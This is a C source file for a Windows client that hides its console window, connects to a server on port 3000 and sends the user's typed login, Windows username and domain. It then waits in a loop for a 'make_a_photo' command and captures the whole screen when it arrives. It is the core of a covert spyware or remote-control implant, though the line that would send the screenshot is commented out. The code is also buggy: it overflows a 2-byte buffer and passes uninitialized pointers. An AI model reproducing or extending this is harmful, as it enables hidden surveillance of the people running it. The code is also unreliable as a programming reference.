#include <stdio.h>
#include <winsock2.h>
#include <string.h>
#include <Windows.h>
// #include <gdiplus.h>


#pragma comment(lib, "ws2_32.lib") //Winsock Library

#define DEFAULT_BUFLEN 512


HWND hwnd;
int x1, y1, x2, y2, w, h;


int main(){

    hwnd = GetConsoleWindow();

    WSADATA wsa;
    int iResult;

    SOCKET s;
    struct sockaddr_in server;

    
    char login[256];
    printf("Enter your login: ");
    scanf("%s", login);

    ShowWindow(hwnd, SW_HIDE);
    Sleep(1000);


    printf("\nInitialising Winsock...");

    if (WSAStartup(MAKEWORD(2,2), &wsa) != 0){
        printf("Failed. Error Code : %d. \nPress a key to exit...", WSAGetLastError());
        return 1;
    }

    printf("Initialised.\n");


    //Create socket
    if((s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == INVALID_SOCKET){
        printf("Could not create socket : %d.\n", WSAGetLastError());
        WSACleanup();
        return 1;
    }

    printf("Socket created. Connecting...\n");
    server.sin_addr.s_addr = inet_addr("127.0.0.1");
    server.sin_family = AF_INET;
    server.sin_port = htons(3000);

    //Connect to remote server
        if (connect(s, (struct sockaddr *)&server, sizeof(server)) < 0)
    {
        printf("Connect error: %d", WSAGetLastError());
        closesocket(s);
        WSACleanup();
        return 1;
    }


    char *username = getenv("username");
    char *userdomain = getenv("userdomain");
    char send_data[2] = "\0";

    strncat(send_data, login, (int)strlen(login));
    strncat(send_data, "_", 1);
    strncat(send_data, username, (int)strlen(username));
    strncat(send_data, "_", 1);
    strncat(send_data, userdomain, (int)strlen(userdomain));

    printf("%s\n", send_data);
    printf("%s_%s\n", username, userdomain);


    char recvbuf[DEFAULT_BUFLEN];
    int recvbuflen = DEFAULT_BUFLEN;


    while (1){

        send(s, send_data, (int)strlen(send_data),  0);

        char recvbuf[DEFAULT_BUFLEN] = "";

        iResult = recv(s, recvbuf, recvbuflen, 0);
        if ( iResult > 0 )
            printf("Bytes received: %d\n", iResult);
        else if ( iResult == 0 )
            printf("Connection closed\n");
        else
            printf("recv failed: %d\n", WSAGetLastError());

        printf("%s\n", recvbuf);

        char chek[] = "make_a_photo";
        
        if (strcmp(recvbuf, chek) == 0){

            BYTE *pData;
            BITMAPINFO *pHeader;

            x1 = GetSystemMetrics(SM_XVIRTUALSCREEN);
            y1 = GetSystemMetrics(SM_YVIRTUALSCREEN);
            x2 = GetSystemMetrics(SM_CXVIRTUALSCREEN);
            y2 = GetSystemMetrics(SM_CYVIRTUALSCREEN);

            w = x2 - x1;
            h = y2 - y1;

            HDC hScreen = GetDC(NULL);
            HDC hDC = CreateCompatibleDC(hScreen);
            HBITMAP hbitmap = CreateCompatibleBitmap(hScreen, w, h);
            HGDIOBJ old_obj = SelectObject(hDC, hbitmap);

            BOOL bRet = BitBlt(hDC, 0, 0, w, h, hScreen, x1, y1, SRCCOPY);

            int file_size = GetDIBits(hScreen, hbitmap, 0, h, pData, pHeader, DIB_PAL_COLORS);

            DeleteDC(hScreen);
            DeleteDC(hDC);

            // send(s, hbitmap, (int)strlen(hbitmap),  0);

        }
        else {
            printf("not equal");
        }

        Sleep(1000);
    }
    return 0;
}